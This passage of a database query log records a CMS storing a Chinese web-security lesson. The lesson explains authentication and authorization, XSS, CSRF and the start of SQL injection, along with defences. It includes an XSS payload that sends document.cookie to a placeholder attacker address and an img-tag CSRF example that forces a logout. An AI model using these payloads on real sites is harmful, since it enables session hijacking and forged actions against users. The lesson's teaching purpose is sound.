3, 0, 1, 12, 15, 0, 0, 12, 0, 15) 
 {executed in 0 msec}
2020-11-19 11:08:37.056 INFO  jdbc.sqltiming Line:373 - select nodebodyen0_.entity_id as entity_i1_3_, nodebodyen0_.body_value as body_val2_3_, nodebodyen0_.body_summary 
as body_sum3_3_, nodebodyen0_.bundle as bundle4_3_, nodebodyen0_.delta as delta5_3_, nodebodyen0_.body_format 
as body_for6_3_, nodebodyen0_.langcode as langcode7_3_, nodebodyen0_.revision_id as revision8_3_ 
from node__body nodebodyen0_ where nodebodyen0_.entity_id=15 
 {executed in 0 msec}
2020-11-19 11:08:37.057 INFO  jdbc.resultsettable Line:610 - 
|----------|-----------|-------------|-------|------|------------|---------|------------|
|entity_id |body_value |body_summary |bundle |delta |body_format |langcode |revision_id |
|----------|-----------|-------------|-------|------|------------|---------|------------|
|----------|-----------|-------------|-------|------|------------|---------|------------|

2020-11-19 11:08:37.057 INFO  jdbc.sqltiming Line:373 - select nodebodyre0_.entity_id as entity_i1_12_0_, nodebodyre0_.body_value as body_val2_12_0_, 
nodebodyre0_.body_summary as body_sum3_12_0_, nodebodyre0_.bundle as bundle4_12_0_, nodebodyre0_.delta 
as delta5_12_0_, nodebodyre0_.body_format as body_for6_12_0_, nodebodyre0_.langcode as langcode7_12_0_, 
nodebodyre0_.revision_id as revision8_12_0_ from node_revision__body nodebodyre0_ where nodebodyre0_.entity_id=15 
 {executed in 0 msec}
2020-11-19 11:08:37.058 INFO  jdbc.resultsettable Line:610 - 
|----------|-----------|-------------|-------|------|------------|---------|------------|
|entity_id |body_value |body_summary |bundle |delta |body_format |langcode |revision_id |
|----------|-----------|-------------|-------|------|------------|---------|------------|
|----------|-----------|-------------|-------|------|------------|---------|------------|

2020-11-19 11:08:37.061 INFO  jdbc.sqltiming Line:373 - insert into node_revision__body (body_value, body_summary, bundle, delta, body_format, langcode, 
revision_id, entity_id) values ('<div data-slate-editor="true" data-key="440" autocorrect="off" 
spellcheck="false" data-gramm="false" style="outline: none; white-space: pre-wrap; overflow-wrap: 
break-word;"> <div class="se-0a2b5403 " data-slate-type="paragraph" data-slate-object="block" 
data-key="441"> <span data-slate-object="text" data-key="442"><span data-slate-leaf="true" 
data-offset-key="442:0" data-first-offset="true"><span data-slate-string="true">你好，我是四火。</span></span></span> 
</div> <div class="se-33e2a9ff " data-slate-type="paragraph" data-slate-object="block" data-key="443"> 
<span data-slate-object="text" data-key="444"><span data-slate-leaf="true" data-offset-key="444:0" 
data-first-offset="true"><span data-slate-string="true">今天，我们来学习一些网站安全的基础知识。作为一名 Web 全栈工程师，不可避免地会经常性地面对网站安全的问题，因此有关安全的学习是十分必要的。这一讲我们就来看一些常见的安全问题，并了解它们相应的解决办法，加强安全意识。</span></span></span> 
</div> <h2 class="se-77866a69" data-slate-type="heading" data-slate-object="block" data-key="445"><span 
data-slate-object="text" data-key="446"><span data-slate-leaf="true" data-offset-key="446:0" 
data-first-offset="true"><span data-slate-string="true">鉴权和授权</span></span></span></h2> <div 
class="se-4e5caecc " data-slate-type="paragraph" data-slate-object="block" data-key="447"> 
<span data-slate-object="text" data-key="448"><span data-slate-leaf="true" data-offset-key="448:0" 
data-first-offset="true"><span data-slate-string="true">我把这两个概念的比较放在开头，是因为这两个概念有相关性且很常用，还有就是这二者太容易被混用了，但是实际上，它们却又是大不相同的。</span></span></span><span 
data-slate-object="text" data-key="449"><span data-slate-leaf="true" data-offset-key="449:0" 
data-first-offset="true"><span class="se-40b0136a" data-slate-type="bold" data-slate-object="mark"><span 
data-slate-string="true">鉴权，Authentication，指的是对于用户身份的鉴别；而授权，Authorization，指的是允许对于特定资源的指定操作。</span></span></span></span> 
</div> <div class="se-311686b6 " data-slate-type="paragraph" data-slate-object="block" data-key="450"> 
<span data-slate-object="text" data-key="451"><span data-slate-leaf="true" data-offset-key="451:0" 
data-first-offset="true"><span data-slate-string="true">我们可以借助具体的例子来深入了解。</span></span></span> 
</div> <div class="se-cc26967d " data-slate-type="paragraph" data-slate-object="block" data-key="452"> 
<span data-slate-object="text" data-key="453"><span data-slate-leaf="true" data-offset-key="453:0" 
data-first-offset="true"><span data-slate-string="true">先说说鉴权。网站的登录系统，输入正确的用户名和密码以便登陆，这个过程就是一个鉴权参与的过程。输入了正确的用户名和密码，系统就能够确认用户的身份，鉴权也就成功了。再比如我们在 
</span></span></span><a data-slate-type="link" data-slate-object="inline" data-key="454" class="se-d795ea91 
se-eb2c7cbb"><span data-slate-object="text" data-key="455"><span data-slate-leaf="true" data-offset-key="455:0" 
data-first-offset="true"><span data-slate-string="true">[第 02 讲]</span></span></span></a><span 
data-slate-object="text" data-key="456"><span data-slate-leaf="true" data-offset-key="456:0" 
data-first-offset="true"><span data-slate-string="true"> 中介绍的 HTTPS 通信，其中的密钥也是起到了“鉴别身份”的作用，这个起作用的过程也属于鉴权。</span></span></span> 
</div> <div class="se-1fd631af " data-slate-type="paragraph" data-slate-object="block" data-key="457"> 
<span data-slate-object="text" data-key="458"><span data-slate-leaf="true" data-offset-key="458:0" 
data-first-offset="true"><span class="se-10dd71b9" data-slate-type="bold" data-slate-object="mark"><span 
data-slate-string="true">为了安全考虑，在实际应用中鉴权有时不是靠“单因子”（Single-Factor）就够了的，我们还会采用“多因子”（Multi-Factor）的方式。</span></span></span></span> 
</div> <div class="se-c6dea544 " data-slate-type="paragraph" data-slate-object="block" data-key="459"> 
<span data-slate-object="text" data-key="460"><span data-slate-leaf="true" data-offset-key="460:0" 
data-first-offset="true"><span data-slate-string="true">举个例子，银行转账的时候，你光输入账号和转账密码，这是属于单因子，一般是不够的，还必须有其它的因子，比如说 
U 盾等等。多个因子之间一般要求是独立的，无依赖关系。再比如说，你通过电话去办理通讯业务的时候，有时候为了证明你的身份，你会被要求提供 PIN 或者密码以外的其他“个人信息”，像是说出最近三次通话的电话号码，这些方式，都是为了增加“鉴权因子”的种类，从而提高安全级别。</span></span></span> 
</div> <div class="se-2acb2df5 " data-slate-type="paragraph" data-slate-object="block" data-key="461"> 
<span data-slate-object="text" data-key="462"><span data-slate-leaf="true" data-offset-key="462:0" 
data-first-offset="true"><span data-slate-string="true">再来举个授权的例子。还记得我们在 </span></span></span><a 
data-slate-type="link" data-slate-object="inline" data-key="463" class="se-d795ea91 se-eb2c7cbb"><span 
data-slate-object="text" data-key="464"><span data-slate-leaf="true" data-offset-key="464:0" 
data-first-offset="true"><span data-slate-string="true">[第 04 讲]</span></span></span></a><span 
data-slate-object="text" data-key="465"><span data-slate-leaf="true" data-offset-key="465:0" 
data-first-offset="true"><span data-slate-string="true"> 中介绍的“资源”吗？对于不同的资源，不同的用户拥有不同的权限，而授权根据权限配置，确定用户对特定的资源是否能执行特定的行为。比如说，我们提到过的图书馆系统，授权确定用户是否能够查看图书信息，是否能够修改图书信息等等。</span></span></span> 
</div> <div class="se-7f30a2c1" data-slate-type="image" data-slate-object="block" data-key="466"> 
<img class="se-805486dc" src="https://static001.geekbang.org/resource/image/90/c2/90f7cb6ebb001eb3fcccaf19091bbec2.png"> 
</div> <h2 class="se-d7f4e6ec" data-slate-type="heading" data-slate-object="block" data-key="467"><span 
data-slate-object="text" data-key="468"><span data-slate-leaf="true" data-offset-key="468:0" 
data-first-offset="true"><span data-slate-string="true">常见的 Web 攻击方式</span></span></span></h2> 
<div class="se-32d1475b " data-slate-type="paragraph" data-slate-object="block" data-key="469"> 
<span data-slate-object="text" data-key="470"><span data-slate-leaf="true" data-offset-key="470:0" 
data-first-offset="true"><span data-slate-string="true">好，我想你已经理解了鉴权和授权的含义与区别。下面我就来介绍几种常见的 
Web 安全问题，在这部分的学习过程中，你可以联想一下在你经历过的项目，是否具备相同的安全隐患？</span></span></span> </div> <h3 class="se-44528791" 
data-slate-type="heading" data-slate-object="block" data-key="471"><span data-slate-object="text" 
data-key="472"><span data-slate-leaf="true" data-offset-key="472:0" data-first-offset="true"><span 
data-slate-string="true">1. XSS</span></span></span></h3> <div class="se-1f894700 " data-slate-type="paragraph" 
data-slate-object="block" data-key="473"> <span data-slate-object="text" data-key="474"><span 
data-slate-leaf="true" data-offset-key="474:0" data-first-offset="true"><span data-slate-string="true">XSS，Cross 
Site Script，跨站脚本攻击。原理是攻击者通过某种方式在网页上嵌入脚本代码，这样，正当用户在浏览网页或执行操作的时候，脚本被执行，就会触发攻击者预期的“不正当”行为。</span></span></span> 
</div> <div class="se-330ebb0e " data-slate-type="paragraph" data-slate-object="block" data-key="475"> 
<span data-slate-object="text" data-key="476"><span data-slate-leaf="true" data-offset-key="476:0" 
data-first-offset="true"><span data-slate-string="true">举个例子。在 </span></span></span><a data-slate-type="link" 
data-slate-object="inline" data-key="477" class="se-d795ea91 se-eb2c7cbb"><span data-slate-object="text" 
data-key="478"><span data-slate-leaf="true" data-offset-key="478:0" data-first-offset="true"><span 
data-slate-string="true">[第 29 讲]</span></span></span></a><span data-slate-object="text" data-key="479"><span 
data-slate-leaf="true" data-offset-key="479:0" data-first-offset="true"><span data-slate-string="true"> 
中我介绍了会话的原理，服务端给用户分配了一个标识身份的字符串，整个会话生命周期内有效，保存在浏览器的 Cookie 中（如果你忘记了，请回看）。</span></span></span> 
</div> <div class="se-aa830d25 " data-slate-type="paragraph" data-slate-object="block" data-key="480"> 
<span data-slate-object="text" data-key="481"><span data-slate-leaf="true" data-offset-key="481:0" 
data-first-offset="true"><span data-slate-string="true">现在，攻击者在服务器返回的普通页面中嵌入特殊的脚本代码，那么在普通用户浏览这个网页的时候，这个特殊的脚本代码就得到了执行，于是用户的 
Cookie 通过请求的方式发送给了这个攻击者指定的地址，这样攻击者就劫持了用户的会话，利用 Cookie 中标识身份的字符串，就可以伪装成实际的用户，来做各种坏事了。这个过程见下图：</span></span></span> 
</div> <div class="se-879995d6" data-slate-type="image" data-slate-object="block" data-key="482"> 
<img class="se-89bb26f1" src="https://static001.geekbang.org/resource/image/e9/ce/e9a926d5164fb90ac617b723c68529ce.jpg"> 
</div> <div class="se-1a9f61b4 " data-slate-type="paragraph" data-slate-object="block" data-key="483"> 
<span data-slate-object="text" data-key="484"><span data-slate-leaf="true" data-offset-key="484:0" 
data-first-offset="true"><span data-slate-string="true">你可能会想了，那在服务器端严格控制，不让用户上传脚本不就得了？</span></span></span> 
</div> <div class="se-ec432e70 " data-slate-type="paragraph" data-slate-object="block" data-key="485"> 
<span data-slate-object="text" data-key="486"><span data-slate-leaf="true" data-offset-key="486:0" 
data-first-offset="true"><span data-slate-string="true">可是，</span></span></span><span data-slate-object="text" 
data-key="487"><span data-slate-leaf="true" data-offset-key="487:0" data-first-offset="true"><span 
class="se-565c9b93" data-slate-type="bold" data-slate-object="mark"><span data-slate-string="true">这个恶意脚本的上传，往往是通过“正常”的页面访问来进行的，因此这个控制方法很容易疏漏。</span></span></span></span><span 
data-slate-object="text" data-key="488"><span data-slate-leaf="true" data-offset-key="488:0" 
data-first-offset="true"><span data-slate-string="true">比如给正常页面的请求添加特殊的参数，或者是提交信息表单的时候，构造一些特殊值。它们是利用网站的漏洞来做文章的，像是缺乏对用户上传的数据进行字符转义，而直接将这样的上传数据显示到页面上。</span></span></span> 
</div> <div class="se-08fddd61 " data-slate-type="paragraph" data-slate-object="block" data-key="489"> 
<span data-slate-object="text" data-key="490"><span data-slate-leaf="true" data-offset-key="490:0" 
data-first-offset="true"><span data-slate-string="true">举个例子：用户可以在电商网站的产品页面提交对产品的评论，并且，这个评论会显示到产品页上。于是攻击者上传了这样一段产品评论：</span></span></span> 
</div> <div class="se-d627538a se-03ba1a9a" data-slate-type="pre" data-slate-object="block" 
data-key="491" data-code-language="javascript"> <div class="se-edfb3e29 se-911a900a"> <span></span> 
</div> <div class="se-1320bc5f"> <div class="se-6f69fcf3 se-e08c2035" data-code-line-number="1"></div> 
<div class="se-6f69fcf3 se-e08c2035" data-code-line-number="2"></div> <div class="se-6f69fcf3 
se-e08c2035" data-code-line-number="3"></div> <div class="se-6f69fcf3 se-e08c2035" data-code-line-number="4"></div> 
<div class="se-6f69fcf3 se-e08c2035" data-code-line-number="5"></div> <div class="se-6f69fcf3 
se-e08c2035" data-code-line-number="6"></div> <div class="se-6f69fcf3 se-e08c2035" data-code-line-number="7"></div> 
</div> <div class="se-17b8c013 ps ps--active-x"> <div class="se-0efb589d se-39cfb103" data-slate-type="code-line" 
data-slate-object="block" data-key="492"> <span data-slate-object="text" data-key="493"><span 
data-slate-leaf="true" data-offset-key="493:0" data-first-offset="true"><span data-slate-string="true">评论内容上半部分</span></span></span> 
</div> <div class="se-0efb589d se-39cfb103" data-slate-type="code-line" data-slate-object="block" 
data-key="494"> <span data-slate-object="text" data-key="495"><span data-slate-leaf="true" 
data-offset-key="495:0" data-first-offset="true"><span data-slate-string="true">&lt;script&gt;</span></span></span> 
</div> <div class="se-0efb589d se-39cfb103" data-slate-type="code-line" data-slate-object="block" 
data-key="496"> <span data-slate-object="text" data-key="497"><span data-slate-leaf="true" 
data-offset-key="497:0" data-first-offset="true"><span data-slate-string="true"> </span></span><span 
data-slate-leaf="true" data-offset-key="497:1"><span class=" gkhl-keyword" data-slate-object="annotation" 
data-annotation-key="gkann_1489351644" data-annotation-type="annotation"><span data-slate-string="true">var</span></span></span><span 
data-slate-leaf="true" data-offset-key="497:2"><span data-slate-string="true"> script =</span></span><span 
data-slate-leaf="true" data-offset-key="497:3"><span class=" gkhl-built_in" data-slate-object="annotation" 
data-annotation-key="gkann_0600045154" data-annotation-type="annotation"><span data-slate-string="true">document</span></span></span><span 
data-slate-leaf="true" data-offset-key="497:4"><span data-slate-string="true">.createElement(</span></span><span 
data-slate-leaf="true" data-offset-key="497:5"><span class=" gkhl-string" data-slate-object="annotation" 
data-annotation-key="gkann_6900053875" data-annotation-type="annotation"><span data-slate-string="true">''script''</span></span></span><span 
data-slate-leaf="true" data-offset-key="497:6"><span data-slate-string="true">);</span></span></span> 
</div> <div class="se-0efb589d se-39cfb103" data-slate-type="code-line" data-slate-object="block" 
data-key="498"> <span data-slate-object="text" data-key="499"><span data-slate-leaf="true" 
data-offset-key="499:0" data-first-offset="true"><span data-slate-string="true"> script.src=</span></span><span 
data-slate-leaf="true" data-offset-key="499:1"><span class=" gkhl-string" data-slate-object="annotation" 
data-annotation-key="gkann_1682325389" data-annotation-type="annotation"><span data-slate-string="true">''http://...?cookie=''</span></span></span><span 
data-slate-leaf="true" data-offset-key="499:2"><span data-slate-string="true"> + </span></span><span 
data-slate-leaf="true" data-offset-key="499:3"><span class=" gkhl-built_in" data-slate-object="annotation" 
data-annotation-key="gkann_9959804411" data-annotation-type="annotation"><span data-slate-string="true">document</span></span></span><span 
data-slate-leaf="true" data-offset-key="499:4"><span data-slate-string="true">.cookie;</span></span></span> 
</div> <div class="se-0efb589d se-39cfb103" data-slate-type="code-line" data-slate-object="block" 
data-key="500"> <span data-slate-object="text" data-key="501"><span data-slate-leaf="true" 
data-offset-key="501:0" data-first-offset="true"><span data-slate-string="true"> </span></span><span 
data-slate-leaf="true" data-offset-key="501:1"><span class=" gkhl-built_in" data-slate-object="annotation" 
data-annotation-key="gkann_3188838340" data-annotation-type="annotation"><span data-slate-string="true">document</span></span></span><span 
data-slate-leaf="true" data-offset-key="501:2"><span data-slate-string="true">.body.appendChild(script);</span></span></span> 
</div> <div class="se-0efb589d se-39cfb103" data-slate-type="code-line" data-slate-object="block" 
data-key="502"> <span data-slate-object="text" data-key="503"><span data-slate-leaf="true" 
data-offset-key="503:0" data-first-offset="true"><span data-slate-string="true">&lt;/script&gt;</span></span></span> 
</div> <div class="se-0efb589d se-39cfb103" data-slate-type="code-line" data-slate-object="block" 
data-key="504"> <span data-slate-object="text" data-key="505"><span data-slate-leaf="true" 
data-offset-key="505:0" data-first-offset="true"><span data-slate-string="true">评论内容下半部分</span></span></span> 
</div> <div class="ps__rail-x" style="width: 365px; left: 0px; bottom: 0px;"> <div class="ps__thumb-x" 
tabindex="0" style="left: 0px; width: 328px;"></div> </div> <div class="ps__rail-y" style="top: 
0px; right: 0px;"> <div class="ps__thumb-y" tabindex="0" style="top: 0px; height: 0px;"></div> 
</div> </div> </div> <div class="se-05ba1af3 " data-slate-type="paragraph" data-slate-object="block" 
data-key="506"> <span data-slate-object="text" data-key="507"><span data-slate-leaf="true" 
data-offset-key="507:0" data-first-offset="true"><span data-slate-string="true">如果这个电商网站没有对用户上传的评论做转义或者字符过滤，那么这个评论在展示的时候会显示“评论内容上半部分”和“评论内容下半部分”，中间的 
script 标签没有任何显示，但其中的脚本却被偷偷摸摸地执行了。</span></span></span> </div> <div class="se-65e62454" data-slate-type="list" 
data-slate-object="block" data-key="508"> <div class="se-9b195ab1 se-ad5f518d" data-slate-type="list-line" 
data-slate-object="block" data-key="509"> <span data-slate-object="text" data-key="510"><span 
data-slate-leaf="true" data-offset-key="510:0" data-first-offset="true"><span data-slate-string="true">浏览器构造了一个新的 
script 节点，并将其 src 属性指向攻击者指定的服务器地址，并将当前页面的 Cookie 放在其参数内。</span></span></span> </div> <div class="se-dfc2f721 
se-440f96fc" data-slate-type="list-line" data-slate-object="block" data-key="511"> <span data-slate-object="text" 
data-key="512"><span data-slate-leaf="true" data-offset-key="512:0" data-first-offset="true"><span 
data-slate-string="true">接着，再将这个新的 script 节点添加到 HTML 页面的 body 标签内。</span></span></span> </div> 
<div class="se-d1fddc89 se-43c0ea76" data-slate-type="list-line" data-slate-object="block" 
data-key="513"> <span data-slate-object="text" data-key="514"><span data-slate-leaf="true" 
data-offset-key="514:0" data-first-offset="true"><span data-slate-string="true">于是，浏览器就会向这个 
src 的地址发送一个带有当前 Cookie 的请求。</span></span></span> </div> </div> <div class="se-ad432fbe " data-slate-type="paragraph" 
data-slate-object="block" data-key="515"> <span data-slate-object="text" data-key="516"><span 
data-slate-leaf="true" data-offset-key="516:0" data-first-offset="true"><span data-slate-string="true">于是攻击者就可以获得用户浏览器内的会话标识串，从而劫持用户的会话了，例如可以仿冒用户的身份购物并寄往指定地址。</span></span></span> 
</div> <div class="se-0592d494 " data-slate-type="paragraph" data-slate-object="block" data-key="517"> 
<span data-slate-object="text" data-key="518"><span data-slate-leaf="true" data-offset-key="518:0" 
data-first-offset="true"><span data-slate-string="true">知道了原理，我们就可以针对 XSS 的特点来进行防御，比如有这样两个思路：</span></span></span> 
</div> <div class="se-358eddfc" data-slate-type="list" data-slate-object="block" data-key="519"> 
<div class="se-9acabbd6 se-364601ea" data-slate-type="list-line" data-slate-object="block" 
data-key="520"> <span data-slate-object="text" data-key="521"><span data-slate-leaf="true" 
data-offset-key="521:0" data-first-offset="true"><span data-slate-string="true">第一个，做好字符转义和过滤，让用户上传的文本在展示的时候永远只是文本，而不可能变成 
HTML 和脚本。</span></span></span> </div> <div class="se-232eaf15 se-4feb97de" data-slate-type="list-line" 
data-slate-object="block" data-key="522"> <span data-slate-object="text" data-key="523"><span 
data-slate-leaf="true" data-offset-key="523:0" data-first-offset="true"><span data-slate-string="true">第二个，控制好 
Cookie 的作用范围。比如服务器在返回 Set-Cookie 头的时候，设置 HttpOnly 这个标识，这样浏览器的脚本就无法获得 Cookie 了，而用户却依然可以继续使用 
Cookie 和会话。</span></span></span> </div> </div> <div class="se-b4aab18e " data-slate-type="paragraph" 
data-slate-object="block" data-key="524"> <span data-slate-object="text" data-key="525"><span 
data-slate-leaf="true" data-offset-key="525:0" data-first-offset="true"><span data-slate-string="true">当然上述内容只是 
XSS 原理的一个简单示意，实际的跨站脚本攻击会比这个复杂且隐蔽得多。而且，这个跨站脚本可不只是能偷偷摸摸地把用户的 Cookie 传给攻击者，还能做其它的事情，比如我下面将要介绍的 
CSRF。</span></span></span> </div> <h3 class="se-94fb732a" data-slate-type="heading" data-slate-object="block" 
data-key="526"><span data-slate-object="text" data-key="527"><span data-slate-leaf="true" data-offset-key="527:0" 
data-first-offset="true"><span data-slate-string="true">2. CSRF</span></span></span></h3> <div 
class="se-3578ed23 " data-slate-type="paragraph" data-slate-object="block" data-key="528"> 
<span data-slate-object="text" data-key="529"><span data-slate-leaf="true" data-offset-key="529:0" 
data-first-offset="true"><span data-slate-string="true">CSRF，Cross-Site Request Forgery，跨站请求伪造，它指的是攻击者让用户进行非其本意的操作。CSRF 
和 XSS 的最大区别在于，</span></span></span><span data-slate-object="text" data-key="530"><span data-slate-leaf="true" 
data-offset-key="530:0" data-first-offset="true"><span class="se-d601cd0d" data-slate-type="bold" 
data-slate-object="mark"><span data-slate-string="true">在 CSRF 的情况下，用户的“非其本意”的行为全部都是从受害用户的浏览器上发生的，而不是从攻击者的浏览器上挟持用户会话以后发起的。</span></span></span></span> 
</div> <div class="se-64f08c22 " data-slate-type="paragraph" data-slate-object="block" data-key="531"> 
<span data-slate-object="text" data-key="532"><span data-slate-leaf="true" data-offset-key="532:0" 
data-first-offset="true"><span data-slate-string="true">在讲 XSS 的时候我讲到了，如果使用 HttpOnly 方式的话，攻击者就无法获得用户的 
Cookie，因此之前例子所介绍的 XSS 就很难发生。但 CSRF 没有这个限制，它可以在不拿到用户 Cookie 的情况下进行攻击，也就是说，从这个角度上看，它更难以防范。</span></span></span> 
</div> <div class="se-2cd164ba " data-slate-type="paragraph" data-slate-object="block" data-key="533"> 
<span data-slate-object="text" data-key="534"><span data-slate-leaf="true" data-offset-key="534:0" 
data-first-offset="true"><span data-slate-string="true">我们还是接着 XSS 中攻击脚本的例子，如果这段脚本不是将用户的 Cookie 
上传，而是直接提交购物下单的 HTTP 请求，并寄往指定地址，那它和 XSS 中的那个例子比较起来看，后果是一样的。因此，从这个角度看，技术变了，从 XSS 变成了 CSRF，可危害程度并没有减轻。这个过程见下图：</span></span></span> 
</div> <div class="se-89e17553" data-slate-type="image" data-slate-object="block" data-key="535"> 
<img class="se-d1d9c8a1" src="https://static001.geekbang.org/resource/image/2b/2c/2baca2397b71c9d92c8d294ff9e1882c.jpg"> 
</div> <div class="se-432a7acb " data-slate-type="paragraph" data-slate-object="block" data-key="536"> 
<span data-slate-object="text" data-key="537"><span data-slate-leaf="true" data-offset-key="537:0" 
data-first-offset="true"><span data-slate-string="true">值得一提的是，有时候这个请求伪造，不一定要通过 JavaScript 
的脚本完成，比如依然是那个电商网站的例子，用户可以发布评论，并且这个评论的录入缺乏字符转义和过滤。现在我们把评论内容改成如下的样子：</span></span></span> </div> 
<div class="se-435d313a se-1c79057e" data-slate-type="pre" data-slate-object="block" data-key="538" 
data-code-language="javascript"> <div class="se-658472b8 se-9f04c527"> <span></span> </div> 
<div class="se-84b123ff"> <div class="se-b1bd6c96 se-63d07e6c" data-code-line-number="1"></div> 
<div class="se-b1bd6c96 se-63d07e6c" data-code-line-number="2"></div> <div class="se-b1bd6c96 
se-63d07e6c" data-code-line-number="3"></div> </div> <div class="se-61ba5fe9 ps"> <div class="se-0efb589d 
se-39cfb103" data-slate-type="code-line" data-slate-object="block" data-key="539"> <span data-slate-object="text" 
data-key="540"><span data-slate-leaf="true" data-offset-key="540:0" data-first-offset="true"><span 
data-slate-string="true">评论内容 </span></span><span data-slate-leaf="true" data-offset-key="540:1"><span 
class=" gkhl-number" data-slate-object="annotation" data-annotation-key="gkann_9253095501" 
data-annotation-type="annotation"><span data-slate-string="true">1</span></span></span></span> 
</div> <div class="se-0efb589d se-39cfb103" data-slate-type="code-line" data-slate-object="block" 
data-key="541"> <span data-slate-object="text" data-key="542"><span data-slate-leaf="true" 
data-offset-key="542:0" data-first-offset="true"><span data-slate-string="true">&lt;img src=</span></span><span 
data-slate-leaf="true" data-offset-key="542:1"><span class=" gkhl-string" data-slate-object="annotation" 
data-annotation-key="gkann_0938163374" data-annotation-type="annotation"><span data-slate-string="true">"/logout"</span></span></span><span 
data-slate-leaf="true" data-offset-key="542:2"><span data-slate-string="true">&gt;</span></span></span> 
</div> <div class="se-0efb589d se-39cfb103" data-slate-type="code-line" data-slate-object="block" 
data-key="543"> <span data-slate-object="text" data-key="544"><span data-slate-leaf="true" 
data-offset-key="544:0" data-first-offset="true"><span data-slate-string="true">评论内容 </span></span><span 
data-slate-leaf="true" data-offset-key="544:1"><span class=" gkhl-number" data-slate-object="annotation" 
data-annotation-key="gkann_8705822892" data-annotation-type="annotation"><span data-slate-string="true">2</span></span></span></span> 
</div> <div class="ps__rail-x" style="left: 0px; bottom: 0px;"> <div class="ps__thumb-x" tabindex="0" 
style="left: 0px; width: 0px;"></div> </div> <div class="ps__rail-y" style="top: 0px; right: 
0px;"> <div class="ps__thumb-y" tabindex="0" style="top: 0px; height: 0px;"></div> </div> </div> 
</div> <div class="se-7ed0522e " data-slate-type="paragraph" data-slate-object="block" data-key="545"> 
<span data-slate-object="text" data-key="546"><span data-slate-leaf="true" data-offset-key="546:0" 
data-first-offset="true"><span data-slate-string="true">你看，原本中间的 script 脚本，变成了 img 标签，这个 img 
图像的 src 是一个相对路径，这里指向的是登出的 URI。于是每当用户访问这个评论展示的页面，浏览器就试图去发送 logout 请求来加载这张假的图片，于是用户就“莫名其妙”地自动登出了。这里攻击者使用了一个 
img 标签来发送这个登出的请求，而没有使用任何脚本。</span></span></span> </div> <div class="se-8ef15a3e " data-slate-type="paragraph" 
data-slate-object="block" data-key="547"> <span data-slate-object="text" data-key="548"><span 
data-slate-leaf="true" data-offset-key="548:0" data-first-offset="true"><span data-slate-string="true">在理解了原理之后，我们就可以制定一些应对策略了。除了和 
XSS 一样，做好字符的转义和过滤以外，针对 CSRF，我们还可以考虑如下应对策略：</span></span></span> </div> <div class="se-c76ac78a" 
data-slate-type="list" data-slate-object="block" data-key="549"> <div class="se-9f90217e se-88d573c0" 
data-slate-type="list-line" data-slate-object="block" data-key="550"> <span data-slate-object="text" 
data-key="551"><span data-slate-leaf="true" data-offset-key="551:0" data-first-offset="true"><span 
data-slate-string="true">第一种，使用 HTTP 的 Referer 头，因为 Referer 头可以携带请求的来源页面地址，这样可以根据 Referer 头鉴别出伪造的请求。</span></span></span> 
</div> <div class="se-0df29add se-1502d021" data-slate-type="list-line" data-slate-object="block" 
data-key="552"> <span data-slate-object="text" data-key="553"><span data-slate-leaf="true" 
data-offset-key="553:0" data-first-offset="true"><span data-slate-string="true">第二种，使用 token，原理上也很简单，服务端给每个表单都生成一个随机值，这个值叫做 
token。Token 和我们前面讲到的用来标识用户身份的 Cookie 所不同的是，前者是对每个页面或每个表单就会生成一个新的值，而后者则是只有会话重新生成的时候才会生成。当用户正常操作的时候，这个 
token 会被带上，从而证明用户操作的合法性，而如果是 CSRF 的情形，这个请求来自于一个非预期的位置，那么就不可能带有这个正确的 token。</span></span></span> 
</div> </div> <div class="se-7be384a1 " data-slate-type="paragraph" data-slate-object="block" 
data-key="554"> <span data-slate-object="text" data-key="555"><span data-slate-leaf="true" 
data-offset-key="555:0" data-first-offset="true"><span class="se-8c2d89b7" data-slate-type="bold" 
data-slate-object="mark"><span data-slate-string="true">值得注意的是，CSRF 和 XSS 不是地位均等的，具体说，在防范 CSRF 
的情况下，必须首先确保没有 XSS 的问题，否则 CSRF 就会失去意义。</span></span></span></span><span data-slate-object="text" 
data-key="556"><span data-slate-leaf="true" data-offset-key="556:0" data-first-offset="true"><span 
data-slate-string="true">因为一旦用户的会话以 XSS 的方式被劫持，攻击者就可以在他自己的浏览器中假装被劫持用户而进行操作。由于攻击者在他自己的浏览器中遵循着正确的操作流程，因而这种情况下无论是 
Referer 头还是 token，从服务端的角度来看都是没有问题的，也就是说，当 XSS 被攻破，所有的 CSRF 的防御就失去了意义。</span></span></span> 
</div> <h3 class="se-0cccab0e" data-slate-type="heading" data-slate-object="block" data-key="557"><span 
data-slate-object="text" data-key="558"><span data-slate-leaf="true" data-offset-key="558:0" 
data-first-offset="true"><span data-slate-string="true">3. SQL 注入</span></span></span></h3> 
<div class="se-5d27433a " data-slate-type="paragraph" data-slate-object="block" data-key="559"> 
<span data-slate-object="text" data-key="560"><span data-slate-leaf="true" data-offset-key="560:0" 
data-first-offset="true"><span data-slate-string="true">SQL 注入，指的是攻击者利用网站漏洞，通过构造特殊的嵌入了 SQL 
命令的网站请求以欺骗服务器，并执行该恶意 SQL 命令。</span></span></span> </div> <div class="se-ab3e04b3 " data-slate-type="paragraph" 
data-slate-object="block" data-key="561"> <span data-slate-object="text" data-key="562"><span 
data-slate-leaf="true" data-offset-key="562:0" data-first-offset="true"><span data-slate-string="true">乍一听也许你会觉得这种方式在技术上可能比较难实现，和前面介绍的在用户的浏览器上做文章比起来，毕竟 
SQL 的执行是位于整个 Web 栈中较靠下的持久层，得“突破层层防守”才能抵达吧，可事实并非如此。</span></span></span> </div> <div class="se-4ebcb8c5 
" data-slate-type="paragraph" data-slate-object="block" data-key="563"> <span data-slate-object="text" 
data-key="564"><span data-slate-leaf="true" data-offset-key="564:0" data-first-offset="true"><span 
data-slate-string="true">SQL 注入原本可是很常见的，这些年由于持久层框架帮 Web 程序员做了很多 SQL 参数注入的事儿，程序员就很少自己去手动拼接 SQL 
了，SQL 注入的漏洞自然就少得多了，但是一旦出现，和 XSS 或 CSRF 比起来，由于不需要特定的用户访问指定的页面，攻击者可以独立完成入侵的过程，并且效果是可以执行 SQL，因而影响往往是巨大的。</span></span></span> 
</div> <div class="se-efad4b15 " data-slate-type="paragraph" data-slate-object="block" data-key="565"> 
<span data-slate-object="text" data-key="566"><span data-slate-leaf="true" data-offset-key="566:0" 
data-first-offset="true"><span data-slate-string="true">比如有这样一条 SQL 的语句拼接：</span></span></span> 
</div> <div class="se-aa224933 se-ce87714d" data-slate-type="pre" data-slate-object="block" 
data-key="567" data-code-language="sql"> <div class="se-7d91f508 se-52aed401"> <span></span> 
</div> <div class="se-4fb9d717"> <div class="se-ab2540e8 se-4a574b7c" data-code-line-number="1"></div> 
</div> <div class="se-9cea6f0d ps ps--active-x"> <div class="se-0efb589d se-39cfb103" data-slate-type="code-line" 
